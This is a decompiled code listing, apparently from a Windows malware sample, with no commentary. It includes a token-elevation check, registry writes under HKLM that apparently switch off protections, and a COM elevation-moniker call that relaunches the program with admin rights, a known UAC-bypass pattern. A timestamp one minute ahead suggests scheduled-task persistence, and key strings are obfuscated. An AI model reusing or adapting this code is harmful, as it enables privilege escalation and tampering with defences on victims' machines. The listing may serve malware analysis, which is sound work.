          *(_DWORD *)&v96[8],
          *(_DWORD *)&v96[12],
          *(_DWORD *)&v96[16],
          *(_DWORD *)&v96[20],
          0,
          *(_DWORD *)&v97[8],
          *(_DWORD *)&v97[12],
          *(_DWORD *)&v97[16],
          *(_DWORD *)&v97[20],
          &v104);
  v81 = v100;
  v98 = v80;
  if ( v100 )
  {
    if ( !_InterlockedDecrement((volatile signed __int32 *)v100 + 2) && v81 )
    {
      if ( *v81 )
      {
        SysFreeString(*v81);
        *v81 = 0;
      }
      if ( v81[1] )
      {
        j_j__free(v81[1]);
        v81[1] = 0;
      }
      sub_44775B(v81);
    }
    v100 = 0;
  }
  VariantClear(&v95);
  v82 = v99;
  if ( v99 )
  {
    if ( !_InterlockedDecrement((volatile signed __int32 *)v99 + 2) && v82 )
    {
      if ( *v82 )
      {
        SysFreeString(*v82);
        *v82 = 0;
      }
      if ( v82[1] )
      {
        j_j__free(v82[1]);
        v82[1] = 0;
      }
      sub_44775B(v82);
    }
    v99 = 0;
  }
  VariantClear(&v94);
  v83 = v102;
  if ( v102 )
  {
    if ( !_InterlockedDecrement((volatile signed __int32 *)v102 + 2) && v83 )
    {
      if ( *v83 )
      {
        SysFreeString(*v83);
        *v83 = 0;
      }
      if ( v83[1] )
      {
        j_j__free(v83[1]);
        v83[1] = 0;
      }
      sub_44775B(v83);
    }
    v102 = 0;
  }
  v117 = -1;
  VariantClear(&v93);
  (*(void (__cdecl **)(int *))(*v115 + 8))(v115);
  (*(void (__cdecl **)(_DWORD))(*(_DWORD *)v116[0] + 8))(v116[0]);
  if ( v98 < 0 )
    goto LABEL_22;
  (*(void (__stdcall **)(int))(*(_DWORD *)v104 + 8))(v104);
  CoUninitialize();
  return 1;
}
// 40DB00: could not find valid save-restore pair for ebp
// 40DB00: could not find valid save-restore pair for edi
// 40DB00: could not find valid save-restore pair for esi
// 40DC68: variable 'v84' is possibly undefined
// 40DE3A: variable 'v86' is possibly undefined
// 40DEEA: variable 'v88' is possibly undefined
// 40DF40: variable 'v31' is possibly undefined
// 40E086: variable 'v44' is possibly undefined
// 40E331: variable 'v89' is possibly undefined
// 40E420: variable 'v66' is possibly undefined
// 40E47B: variable 'v68' is possibly undefined
// 49E604: using guessed type wchar_t aM[2];
// 49E608: using guessed type wchar_t aPt[3];

//----- (0040E6B0) --------------------------------------------------------
_DWORD *__userpurge sub_40E6B0@<eax>(int a1@<ebp>, _DWORD *a2, int a3)
{
  _DWORD *v3; // esi
  char *v4; // eax
  unsigned int v5; // eax
  void **v6; // ecx
  void **v7; // edi
  void **v8; // esi
  __int128 v9; // xmm0
  void *v10; // ecx
  __int128 v12; // [esp-7Ch] [ebp-88h] BYREF
  __int64 v13; // [esp-6Ch] [ebp-78h]
  __int128 *v14; // [esp-64h] [ebp-70h]
  _DWORD *v15; // [esp-60h] [ebp-6Ch]
  struct tm v16; // [esp-5Ch] [ebp-68h] BYREF
  __int64 v17; // [esp-38h] [ebp-44h] BYREF
  void *v18[4]; // [esp-2Ch] [ebp-38h] BYREF
  size_t v19; // [esp-1Ch] [ebp-28h]
  unsigned int v20; // [esp-18h] [ebp-24h]
  int *v21; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h]
  void *v23; // [esp-8h] [ebp-14h]
  int v24; // [esp-4h] [ebp-10h]
  int v25; // [esp+0h] [ebp-Ch]
  int v26; // [esp+4h] [ebp-8h]
  int v27; // [esp+8h] [ebp-4h] BYREF
  int retaddr; // [esp+Ch] [ebp+0h]

  v25 = a1;
  v26 = retaddr;
  v24 = -1;
  v23 = &loc_482390;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v21 = &v27;
  v3 = a2;
  v14 = (__int128 *)a2;
  v15 = a2;
  v17 = 0i64;
  sub_462E7B(&v17);
  _localtime64_s(&v16, &v17);
  if ( v16.tm_min == 59 )
  {
    if ( v16.tm_hour >= 23 )
    {
      v16.tm_hour = 0;
      v16.tm_min = 0;
    }
    else
    {
      v16.tm_min = 0;
      ++v16.tm_hour;
    }
  }
  else
  {
    ++v16.tm_min;
  }
  v19 = 0;
  v20 = 15;
  LOBYTE(v18[0]) = 0;
  sub_40A250(v18, 0x104u, 0);
  v24 = 0;
  v4 = (char *)v18;
  if ( v20 >= 0x10 )
    v4 = (char *)v18[0];
  v5 = strftime(v4, v19, "%Y-%m-%dT%H:%M:%S", &v16);
  if ( v5 )
  {
    sub_40E9F0(v18, v5, 0);
    v6 = v18;
    v7 = v18;
    if ( v20 >= 0x10 )
      v6 = (void **)v18[0];
    v8 = (void **)((char *)v6 + v19);
    v13 = 0x700000000i64;
    if ( v20 >= 0x10 )
      v7 = (void **)v18[0];
    LOWORD(v12) = 0;
    sub_40AF10(&v12, (char *)v8 - (char *)v7);
    v14 = &v12;
    for ( LOBYTE(v24) = 1; v7 != v8; v7 = (void **)((char *)v7 + 1) )
      sub_40E8C0((int *)&v12, *(char *)v7);
    v3 = v15;
    v9 = v12;
    LOWORD(v12) = 0;
    v15[4] = 0;
    v3[5] = 0;
    *(_OWORD *)v3 = v9;
    *((_QWORD *)v3 + 2) = v13;
    v13 = 0x700000000i64;
  }
  else
  {
    a2[4] = 0;
    a2[5] = 7;
    *(_WORD *)a2 = 0;
    sub_404330(a2, (void *)&psz, 0);
  }
  if ( v20 >= 0x10 )
  {
    v10 = v18[0];
    if ( v20 + 1 >= 0x1000 )
    {
      v10 = (void *)*((_DWORD *)v18[0] - 1);
      if ( (unsigned int)(v18[0] - v10 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v10);
  }
  return v3;
}
// 40E6B0: could not find valid save-restore pair for ebp

//----- (0040E8C0) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __thiscall sub_40E8C0(int *Src, __int16 a2)
{
  int *v2; // esi
  unsigned int v3; // ecx
  unsigned int v4; // ebx
  int result; // eax
  unsigned int v6; // edi
  _DWORD *v7; // eax
  size_t v8; // ecx
  _WORD *v9; // edi
  _DWORD *v10; // edi
  _WORD *v11; // [esp+8h] [ebp-Ch]
  unsigned int v12; // [esp+Ch] [ebp-8h]
  int v13; // [esp+10h] [ebp-4h]

  v2 = Src;
  v3 = Src[5];
  v4 = v2[4];
  v12 = v3;
  if ( v4 >= v3 )
  {
    if ( v4 == 2147483646 )
      sub_404900();
    v6 = (v4 + 1) | 7;
    if ( v6 <= 0x7FFFFFFE )
    {
      if ( v3 <= 2147483646 - (v3 >> 1) )
      {
        if ( v6 < v3 + (v3 >> 1) )
          v6 = v3 + (v3 >> 1);
      }
      else
      {
        v6 = 2147483646;
      }
    }
    else
    {
      v6 = 2147483646;
    }
    v7 = sub_404910(v6 + 1);
    v2[5] = v6;
    v2[4] = v4 + 1;
    v8 = 2 * v4;
    v13 = (int)v7;
    v9 = (_WORD *)v7 + v4;
    v11 = v9;
    if ( v12 < 8 )
    {
      memmove(v7, v2, v8);
      *v9 = a2;
      v9[1] = 0;
      result = v13;
      *v2 = v13;
    }
    else
    {
      v10 = (_DWORD *)*v2;
      memmove(v7, (const void *)*v2, v8);
      *v11 = a2;
      v11[1] = 0;
      if ( 2 * v12 + 2 >= 0x1000 )
      {
        if ( (unsigned int)v10 - *(v10 - 1) - 4 > 0x1F )
          _invalid_parameter_noinfo_noreturn();
        v10 = (_DWORD *)*(v10 - 1);
      }
      sub_44775B(v10);
      result = v13;
      *v2 = v13;
    }
  }
  else
  {
    v2[4] = v4 + 1;
    if ( v3 >= 8 )
      v2 = (int *)*v2;
    *((_WORD *)v2 + v4) = a2;
    result = 0;
    *((_WORD *)v2 + v4 + 1) = 0;
  }
  return result;
}
// 40E9D7: bad sp value at call
// 404900: using guessed type void __noreturn sub_404900(void);

//----- (0040E9F0) --------------------------------------------------------
void **__thiscall sub_40E9F0(_DWORD *this, unsigned int a2, int a3)
{
  unsigned int v3; // ebx
  unsigned int *v4; // esi
  bool v5; // cf
  char *v6; // esi
  void **result; // eax

  v3 = this[4];
  v4 = this + 4;
  if ( a2 > v3 )
  {
    if ( a2 - v3 > this[5] - v3 )
    {
      return sub_40EAC0((void **)this, a2 - v3, a3, a2 - v3, a3);
    }
    else
    {
      v5 = this[5] < 0x10u;
      *v4 = a2;
      if ( !v5 )
        this = (_DWORD *)*this;
      v6 = (char *)this + v3;
      result = (void **)memset((char *)this + v3, (char)a3, a2 - v3);
      v6[a2 - v3] = 0;
    }
  }
  else
  {
    if ( this[5] >= 0x10u )
      this = (_DWORD *)*this;
    *v4 = a2;
    *((_BYTE *)this + a2) = 0;
  }
  return result;
}

//----- (0040EA60) --------------------------------------------------------
void **__thiscall sub_40EA60(void **Src, size_t Size, int a3)
{
  unsigned int v4; // edx
  char *v5; // ecx
  void *v6; // eax
  char *v7; // esi

  v4 = (unsigned int)Src[5];
  v5 = (char *)Src[4];
  if ( Size > v4 - (unsigned int)v5 )
    return sub_40EAC0(Src, Size, a3, Size, a3);
  Src[4] = &v5[Size];
  v6 = Src;
  if ( v4 >= 0x10 )
    v6 = *Src;
  v7 = &v5[(_DWORD)v6];
  memset(&v5[(_DWORD)v6], (char)a3, Size);
  v7[Size] = 0;
  return Src;
}

//----- (0040EAC0) --------------------------------------------------------
void **__thiscall sub_40EAC0(void **Src, unsigned int a2, int a3, size_t a4, char a5)
{
  size_t v6; // edx
  unsigned int v7; // edi
  unsigned int v8; // esi
  size_t v9; // eax
  void *v10; // eax
  _DWORD *v11; // edi
  _DWORD *v12; // eax
  char *v13; // esi
  void *v14; // esi
  void **result; // eax
  char *v16; // [esp+Ch] [ebp-10h]
  unsigned int v17; // [esp+10h] [ebp-Ch]
  size_t v18; // [esp+14h] [ebp-8h]
  _BYTE *v19; // [esp+14h] [ebp-8h]
  size_t Size; // [esp+18h] [ebp-4h]

  v6 = (size_t)Src[4];
  Size = v6;
  if ( 0x7FFFFFFF - v6 < a2 )
    sub_404900();
  v7 = (unsigned int)Src[5];
  v18 = v6 + a2;
  v8 = (v6 + a2) | 0xF;
  v17 = v7;
  if ( v8 > 0x7FFFFFFF )
  {
    v8 = 0x7FFFFFFF;
LABEL_4:
    v9 = -2147483613;
    goto LABEL_5;
  }
  if ( v7 > 0x7FFFFFFF - (v7 >> 1) )
  {
    v8 = 0x7FFFFFFF;
    goto LABEL_4;
  }
  if ( v8 < v7 + (v7 >> 1) )
    v8 = v7 + (v7 >> 1);
  if ( v8 + 1 < 0x1000 )
  {
    if ( v8 == -1 )
    {
      v11 = 0;
    }
    else
    {
      v12 = operator new(v8 + 1);
      v6 = Size;
      v11 = v12;
    }
    goto LABEL_17;
  }
  v9 = v8 + 36;
  if ( v8 + 36 <= v8 + 1 )
    sub_403CC0();
LABEL_5:
  v10 = operator new(v9);
  if ( !v10 )
    goto LABEL_25;
  v6 = Size;
  v11 = (_DWORD *)(((unsigned int)v10 + 35) & 0xFFFFFFE0);
  *(v11 - 1) = v10;
LABEL_17:
  Src[4] = (void *)v18;
  Src[5] = (void *)v8;
  v13 = (char *)v11 + v6;
  v16 = (char *)v11 + v6;
  v19 = (char *)v11 + v6 + a4;
  if ( v17 >= 0x10 )
  {
    v14 = *Src;
    memmove(v11, *Src, v6);
    memset(v16, a5, a4);
    *v19 = 0;
    if ( v17 + 1 < 0x1000 )
    {
LABEL_21:
      sub_44775B(v14);
      *Src = v11;
      return Src;
    }
    if ( (unsigned int)v14 - *((_DWORD *)v14 - 1) - 4 <= 0x1F )
    {
      v14 = (void *)*((_DWORD *)v14 - 1);
      goto LABEL_21;
    }
LABEL_25:
    _invalid_parameter_noinfo_noreturn();
  }
  memmove(v11, Src, v6);
  memset(v13, a5, a4);
  *v19 = 0;
  result = Src;
  *Src = v11;
  return result;
}
// 403CC0: using guessed type void __noreturn sub_403CC0(void);
// 404900: using guessed type void __noreturn sub_404900(void);

//----- (0040EC80) --------------------------------------------------------
char __thiscall sub_40EC80(_DWORD *this)
{
  bool v2; // bl
  HANDLE CurrentProcess; // eax
  HANDLE TokenHandle; // [esp+0h] [ebp-10h] BYREF
  DWORD ReturnLength; // [esp+4h] [ebp-Ch] BYREF
  int TokenInformation; // [esp+8h] [ebp-8h] BYREF

  if ( *this == 1 )
    return 1;
  TokenHandle = 0;
  v2 = 0;
  CurrentProcess = GetCurrentProcess();
  if ( OpenProcessToken(CurrentProcess, 8u, &TokenHandle) )
  {
    TokenInformation = 0;
    ReturnLength = 4;
    if ( GetTokenInformation(TokenHandle, TokenElevation, &TokenInformation, 4u, &ReturnLength) )
      v2 = TokenInformation != 0;
  }
  if ( TokenHandle )
    CloseHandle(TokenHandle);
  return v2;
}

//----- (0040ED20) --------------------------------------------------------
void __thiscall sub_40ED20(_DWORD *this, int a2)
{
  int v2; // esi
  int v3; // eax
  void *v4; // ecx
  void *v5; // ecx
  int v6; // esi
  int v7; // eax
  void *v8; // ecx
  void *v9; // ecx
  void *v10; // [esp+8h] [ebp-74h] BYREF
  unsigned int v11; // [esp+1Ch] [ebp-60h]
  void *v12; // [esp+20h] [ebp-5Ch] BYREF
  unsigned int v13; // [esp+34h] [ebp-48h]
  void *v14[5]; // [esp+38h] [ebp-44h] BYREF
  unsigned int v15; // [esp+4Ch] [ebp-30h]
  void *Block[5]; // [esp+50h] [ebp-2Ch] BYREF
  unsigned int v17; // [esp+64h] [ebp-18h]
  BYTE Data[4]; // [esp+68h] [ebp-14h] BYREF
  HKEY phkResult; // [esp+6Ch] [ebp-10h] BYREF
  int v20; // [esp+78h] [ebp-4h]
  int savedregs; // [esp+7Ch] [ebp+0h] BYREF

  if ( sub_40EC80(this) )
  {
    v2 = sub_40C780(&dword_4F90D0, (int)&v12, (int)&savedregs);
    v20 = 0;
    v3 = sub_40C780(&dword_4F91D8, (int)Block, (int)&savedregs);
    *(_DWORD *)Data = 0;
    phkResult = HKEY_LOCAL_MACHINE;
    if ( *(_DWORD *)(v3 + 16) && *(_DWORD *)(v2 + 16) )
    {
      if ( *(_DWORD *)(v3 + 20) >= 8u )
        v3 = *(_DWORD *)v3;
      if ( !RegOpenKeyExW(HKEY_LOCAL_MACHINE, (LPCWSTR)v3, 0, 0xF003Fu, &phkResult) )
      {
        if ( *(_DWORD *)(v2 + 20) >= 8u )
          v2 = *(_DWORD *)v2;
        RegSetValueExW(phkResult, (LPCWSTR)v2, 0, 4u, Data, 4u);
        RegCloseKey(phkResult);
      }
    }
    if ( v17 >= 8 )
    {
      v4 = Block[0];
      if ( 2 * v17 + 2 >= 0x1000 )
      {
        v4 = (void *)*((_DWORD *)Block[0] - 1);
        if ( (unsigned int)(Block[0] - v4 - 4) > 0x1F )
          goto LABEL_35;
      }
      sub_44775B(v4);
    }
    v20 = -1;
    Block[4] = 0;
    v17 = 7;
    LOWORD(Block[0]) = 0;
    if ( v13 < 8 )
    {
LABEL_18:
      v6 = sub_40C780(&dword_4F9220, (int)&v10, (int)&savedregs);
      v20 = 1;
      v7 = sub_40C780(&dword_4F91D8, (int)v14, (int)&savedregs);
      *(_DWORD *)Data = 0;
      phkResult = HKEY_LOCAL_MACHINE;
      if ( *(_DWORD *)(v7 + 16) && *(_DWORD *)(v6 + 16) )
      {
        if ( *(_DWORD *)(v7 + 20) >= 8u )
          v7 = *(_DWORD *)v7;
        if ( !RegOpenKeyExW(HKEY_LOCAL_MACHINE, (LPCWSTR)v7, 0, 0xF003Fu, &phkResult) )
        {
          if ( *(_DWORD *)(v6 + 20) >= 8u )
            v6 = *(_DWORD *)v6;
          RegSetValueExW(phkResult, (LPCWSTR)v6, 0, 4u, Data, 4u);
          RegCloseKey(phkResult);
        }
      }
      if ( v15 >= 8 )
      {
        v8 = v14[0];
        if ( 2 * v15 + 2 >= 0x1000 )
        {
          v8 = (void *)*((_DWORD *)v14[0] - 1);
          if ( (unsigned int)(v14[0] - v8 - 4) > 0x1F )
            goto LABEL_36;
        }
        sub_44775B(v8);
      }
      v14[4] = 0;
      v15 = 7;
      LOWORD(v14[0]) = 0;
      if ( v11 < 8 )
        return;
      v9 = v10;
      if ( 2 * v11 + 2 < 0x1000
        || (v9 = (void *)*((_DWORD *)v10 - 1), (unsigned int)((_BYTE *)v10 - (_BYTE *)v9 - 4) <= 0x1F) )
      {
        sub_44775B(v9);
        return;
      }
LABEL_36:
      _invalid_parameter_noinfo_noreturn();
    }
    v5 = v12;
    if ( 2 * v13 + 2 < 0x1000
      || (v5 = (void *)*((_DWORD *)v12 - 1), (unsigned int)((_BYTE *)v12 - (_BYTE *)v5 - 4) <= 0x1F) )
    {
      sub_44775B(v5);
      goto LABEL_18;
    }
LABEL_35:
    _invalid_parameter_noinfo_noreturn();
  }
}

//----- (0040EF90) --------------------------------------------------------
void sub_40EF90()
{
  int v0; // eax
  char v1; // al
  void *v2; // ecx
  int v3; // eax
  char v4; // al
  void *v5; // ecx
  int v6; // eax
  void *v7; // ecx
  int v8; // eax
  void *v9; // ecx
  int v10; // ecx
  BIND_OPTS *p_pBindOptions; // eax
  int v12; // eax
  void (__stdcall *v13)(void *, void **, _DWORD, _DWORD, _DWORD, int); // esi
  _WORD *v14; // edx
  WCHAR *p_Src; // eax
  DWORD ModuleFileNameW; // eax
  __int128 *v17; // ecx
  __int128 *v18; // eax
  __int64 v19; // xmm0_8
  void **v20; // ecx
  int v21; // eax
  void *v22; // ecx
  void *v23[5]; // [esp+Ch] [ebp-2F4h] BYREF
  unsigned int v24; // [esp+20h] [ebp-2E0h]
  void *v25[5]; // [esp+24h] [ebp-2DCh] BYREF
  unsigned int v26; // [esp+38h] [ebp-2C8h]
  void *v27[5]; // [esp+3Ch] [ebp-2C4h] BYREF
  unsigned int v28; // [esp+50h] [ebp-2B0h]
  void *Block[5]; // [esp+54h] [ebp-2ACh] BYREF
  unsigned int v30; // [esp+68h] [ebp-298h]
  void *v31[4]; // [esp+6Ch] [ebp-294h] BYREF
  __int64 v32; // [esp+7Ch] [ebp-284h]
  char v33; // [esp+87h] [ebp-279h]
  void *ppv; // [esp+88h] [ebp-278h] BYREF
  BIND_OPTS pBindOptions; // [esp+8Ch] [ebp-274h] BYREF
  int v36; // [esp+A0h] [ebp-260h]
  CLSID pclsid; // [esp+B0h] [ebp-250h] BYREF
  IID iid; // [esp+C0h] [ebp-240h] BYREF
  __int128 Src; // [esp+D0h] [ebp-230h] BYREF
  DWORD nSize[2]; // [esp+E0h] [ebp-220h]
  wchar_t Destination[260]; // [esp+E8h] [ebp-218h] BYREF
  int v42; // [esp+2FCh] [ebp-4h]
  int savedregs; // [esp+300h] [ebp+0h] BYREF

  if ( !CoInitialize(0) )
  {
    pclsid = 0i64;
    v0 = sub_40C780(&dword_4F9250, (int)Block, (int)&savedregs);
    if ( *(_DWORD *)(v0 + 20) >= 8u )
      v0 = *(_DWORD *)v0;
    v1 = CLSIDFromString((LPCOLESTR)v0, &pclsid) == 0;
    v33 = v1;
    if ( v30 >= 8 )
    {
      v2 = Block[0];
      if ( 2 * v30 + 2 >= 0x1000 )
      {
        v2 = (void *)*((_DWORD *)Block[0] - 1);
        if ( (unsigned int)(Block[0] - v2 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_44775B(v2);
      v1 = v33;
    }
    Block[4] = 0;
    v30 = 7;
    LOWORD(Block[0]) = 0;
    if ( v1 )
    {
      iid = 0i64;
      v3 = sub_40C780(&dword_4F8F38, (int)v27, (int)&savedregs);
      if ( *(_DWORD *)(v3 + 20) >= 8u )
        v3 = *(_DWORD *)v3;
      v4 = IIDFromString((LPCOLESTR)v3, &iid) == 0;
      v33 = v4;
      if ( v28 >= 8 )
      {
        v5 = v27[0];
        if ( 2 * v28 + 2 >= 0x1000 )
        {
          v5 = (void *)*((_DWORD *)v27[0] - 1);
          if ( (unsigned int)(v27[0] - v5 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        sub_44775B(v5);
        v4 = v33;
      }
      v27[4] = 0;
      v28 = 7;
      LOWORD(v27[0]) = 0;
      if ( v4 )
      {
        memset(Destination, 0, sizeof(Destination));
        v6 = sub_40C780(&dword_4F8ED8, (int)v25, (int)&savedregs);
        if ( *(_DWORD *)(v6 + 20) >= 8u )
          v6 = *(_DWORD *)v6;
        wcscpy_s(Destination, 0x104u, (const wchar_t *)v6);
        if ( v26 >= 8 )
        {
          v7 = v25[0];
          if ( 2 * v26 + 2 >= 0x1000 )
          {
            v7 = (void *)*((_DWORD *)v25[0] - 1);
            if ( (unsigned int)(v25[0] - v7 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          sub_44775B(v7);
        }
        v25[4] = 0;
        v26 = 7;
        LOWORD(v25[0]) = 0;
        v8 = sub_40C780(&dword_4F9250, (int)v23, (int)&savedregs);
        if ( *(_DWORD *)(v8 + 20) >= 8u )
          v8 = *(_DWORD *)v8;
        wcscat_s(Destination, 0x104u, (const wchar_t *)v8);
        if ( v24 >= 8 )
        {
          v9 = v23[0];
          if ( 2 * v24 + 2 >= 0x1000 )
          {
            v9 = (void *)*((_DWORD *)v23[0] - 1);
            if ( (unsigned int)(v23[0] - v9 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          sub_44775B(v9);
        }
        v23[4] = 0;
        LOWORD(v23[0]) = 0;
        v10 = 36;
        v24 = 7;
        p_pBindOptions = &pBindOptions;
        do
        {
          LOBYTE(p_pBindOptions->cbStruct) = 0;
          p_pBindOptions = (BIND_OPTS *)((char *)p_pBindOptions + 1);
          --v10;
        }
        while ( v10 );
        pBindOptions.cbStruct = 36;
        v36 = 4;
        ppv = 0;
        while ( CoGetObject(Destination, &pBindOptions, &iid, &ppv) )
          ;
        if ( ppv )
        {
          v12 = *(_DWORD *)ppv;
          nSize[0] = 0;
          nSize[1] = 7;
          v13 = *(void (__stdcall **)(void *, void **, _DWORD, _DWORD, _DWORD, int))(v12 + 36);
          LOWORD(Src) = 0;
          v14 = sub_404910(0x108u);
          nSize[0] = 260;
          nSize[1] = 263;
          memset(v14, 0, 0x208u);
          v14[260] = 0;
          LODWORD(Src) = v14;
          v42 = 0;
          p_Src = (WCHAR *)&Src;
          if ( nSize[1] >= 8 )
            p_Src = v14;
          ModuleFileNameW = GetModuleFileNameW(0, p_Src, nSize[0]);
          if ( ModuleFileNameW )
          {
            if ( ModuleFileNameW > nSize[0] )
            {
              sub_405640(&Src, ModuleFileNameW - nSize[0], 0);
            }
            else
            {
              v17 = &Src;
              nSize[0] = ModuleFileNameW;
              if ( nSize[1] >= 8 )
                v17 = (__int128 *)Src;
              *((_WORD *)v17 + ModuleFileNameW) = 0;
            }
          }
          else
          {
            v18 = &Src;
            nSize[0] = 0;
            if ( nSize[1] >= 8 )
              v18 = (__int128 *)Src;
            *(_WORD *)v18 = 0;
          }
          v19 = *(_QWORD *)nSize;
          *(_OWORD *)v31 = Src;
          nSize[0] = 0;
          v32 = v19;
          nSize[1] = 7;
          LOWORD(Src) = 0;
          v42 = 1;
          v20 = v31;
          v21 = _mm_cvtsi128_si32(*(__m128i *)v31);
          if ( HIDWORD(v19) >= 8 )
            v20 = (void **)v21;
          v13(ppv, v20, 0, 0, 0, 5);
          v42 = -1;
          if ( HIDWORD(v32) >= 8 )
          {
            v22 = v31[0];
            if ( (unsigned int)(2 * HIDWORD(v32) + 2) >= 0x1000 )
            {
              v22 = (void *)*((_DWORD *)v31[0] - 1);
              if ( (unsigned int)(v31[0] - v22 - 4) > 0x1F )
                _invalid_parameter_noinfo_noreturn();
            }
            sub_44775B(v22);
          }
          v32 = 0x700000000i64;
          LOWORD(v31[0]) = 0;
          (*(void (__stdcall **)(void *))(*(_DWORD *)ppv + 8))(ppv);
        }
      }
    }
    CoUninitialize();
  }
}

//----- (0040F4B0) --------------------------------------------------------
int __thiscall sub_40F4B0(int this)
{
  _DWORD *v2; // eax
  volatile signed __int32 *v3; // esi
  int v4; // ecx
  volatile signed __int32 *v5; // esi
  _DWORD *Block; // [esp+18h] [ebp-10h]

  sub_40F700((_DWORD *)this, 0, 0, 1);
  *(_DWORD *)this = &ANICore::`vftable';
  *(_DWORD *)(this + 24) = 0;
  *(_DWORD *)(this + 28) = 0;
  Block = operator new(0x14u);
  *(_QWORD *)Block = 0i64;
  Block[2] = 0;
  Block[1] = 1;
  Block[2] = 1;
  *Block = &std::_Ref_count_obj2<ANMediator>::`vftable';
  Block[3] = 0;
  Block[4] = 0;
  v2 = operator new(0x18u);
  *v2 = v2;
  v2[1] = v2;
  v2[2] = v2;
  *((_WORD *)v2 + 6) = 257;
  Block[3] = v2;
  *(_DWORD *)(this + 24) = Block + 3;
  v3 = *(volatile signed __int32 **)(this + 28);
  *(_DWORD *)(this + 28) = Block;
  if ( v3 )
  {
    if ( !_InterlockedExchangeAdd(v3 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))v3)(v3);
      if ( !_InterlockedExchangeAdd(v3 + 2, 0xFFFFFFFF) )
        (*(void (__thiscall **)(volatile signed __int32 *))(*v3 + 4))(v3);
    }
  }
  v4 = *(_DWORD *)(this + 28);
  if ( v4 )
  {
    _InterlockedIncrement((volatile signed __int32 *)(v4 + 4));
    v4 = *(_DWORD *)(this + 28);
  }
  v5 = *(volatile signed __int32 **)(this + 8);
  *(_DWORD *)(this + 4) = *(_DWORD *)(this + 24);
  *(_DWORD *)(this + 8) = v4;
  if ( v5 )
  {
    if ( !_InterlockedExchangeAdd(v5 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))v5)(v5);
      if ( !_InterlockedDecrement(v5 + 2) )
        (*(void (__thiscall **)(volatile signed __int32 *))(*v5 + 4))(v5);
    }
  }
  sub_40FF00(*(int **)(this + 24), this);
  return this;
}
// 49E628: using guessed type void *std::_Ref_count_obj2<ANMediator>::`vftable';
// 49E63C: using guessed type void *ANICore::`vftable';

//----- (0040F600) --------------------------------------------------------
_DWORD *__thiscall sub_40F600(_DWORD *Block, char a2)
{
  volatile signed __int32 *v3; // edi

  *Block = &ANICore::`vftable';
  v3 = (volatile signed __int32 *)Block[7];
  if ( v3 )
  {
    if ( !_InterlockedExchangeAdd(v3 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))v3)(v3);
      if ( !_InterlockedDecrement(v3 + 2) )
        (*(void (__thiscall **)(volatile signed __int32 *))(*v3 + 4))(v3);
    }
  }
  sub_40F840(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 49E63C: using guessed type void *ANICore::`vftable';

//----- (0040F6B0) --------------------------------------------------------
void __thiscall sub_40F6B0(_DWORD *this)
{
  _DWORD *v1; // edi
  _DWORD *v2; // eax
  _DWORD *v3; // esi
  void *v4; // eax

  v1 = this + 3;
  v2 = (_DWORD *)this[3];
  v3 = (_DWORD *)v2[1];
  if ( !*((_BYTE *)v3 + 13) )
  {
    do
    {
      sub_410450((int)v1, (void **)v3[2]);
      v4 = v3;
      v3 = (_DWORD *)*v3;
      sub_44775B(v4);
    }
    while ( !*((_BYTE *)v3 + 13) );
    v2 = (_DWORD *)*v1;
  }
  sub_44775B(v2);
}

//----- (0040F6C0) --------------------------------------------------------
_DWORD *__thiscall sub_40F6C0(_DWORD *Block, char a2)
{
  *Block = &std::_Ref_count_obj2<ANMediator>::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 49E628: using guessed type void *std::_Ref_count_obj2<ANMediator>::`vftable';

//----- (0040F6F0) --------------------------------------------------------
void __noreturn sub_40F6F0()
{
  sub_42E588((int)"map/set too long");
}
// 40F6F0: using guessed type void __noreturn sub_40F6F0();

//----- (0040F700) --------------------------------------------------------
_DWORD *__thiscall sub_40F700(_DWORD *this, int a2, volatile signed __int32 *a3, int a4)
{
  volatile signed __int32 *v5; // ecx
  _DWORD *v6; // eax
  int *v7; // ecx

  v5 = a3;
  *this = &ANIColleague::`vftable';
  this[1] = 0;
  this[2] = 0;
  if ( a3 )
  {
    _InterlockedIncrement(a3 + 1);
    v5 = a3;
  }
  this[1] = a2;
  this[2] = v5;
  this[3] = a4;
  this[4] = 0;
  this[5] = 0;
  v6 = operator new(0x40u);
  *v6 = v6;
  v6[1] = v6;
  v6[2] = v6;
  *((_WORD *)v6 + 6) = 257;
  this[4] = v6;
  v7 = (int *)this[1];
  if ( v7 )
    sub_40FF00(v7, (int)this);
  if ( a3 )
  {
    if ( !_InterlockedExchangeAdd(a3 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))a3)(a3);
      if ( !_InterlockedDecrement(a3 + 2) )
        (*(void (__thiscall **)(volatile signed __int32 *))(*a3 + 4))(a3);
    }
  }
  return this;
}
// 49E668: using guessed type void *ANIColleague::`vftable';

//----- (0040F7F0) --------------------------------------------------------
_DWORD *__thiscall sub_40F7F0(_DWORD *Block, char a2)
{
  sub_40F840(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0040F840) --------------------------------------------------------
void __thiscall sub_40F840(_DWORD *this)
{
  int *v2; // esi
  int v3; // ebx
  int **v4; // eax
  int v5; // ecx
  int **v6; // eax
  volatile signed __int32 *v7; // esi
  int v8; // [esp+8h] [ebp-10h] BYREF
  int v9; // [esp+10h] [ebp-8h]
  int v10; // [esp+14h] [ebp-4h] BYREF

  v2 = (int *)this[1];
  *this = &ANIColleague::`vftable';
  if ( v2 )
  {
    v3 = this[3];
    v10 = v3;
    sub_40FC10(v2, &v8, &v10);
    v4 = (int **)v9;
    if ( *(_BYTE *)(v9 + 13) || v3 < *(_DWORD *)(v9 + 16) )
    {
      v4 = (int **)*v2;
      v5 = *v2;
    }
    else
    {
      v5 = *v2;
    }
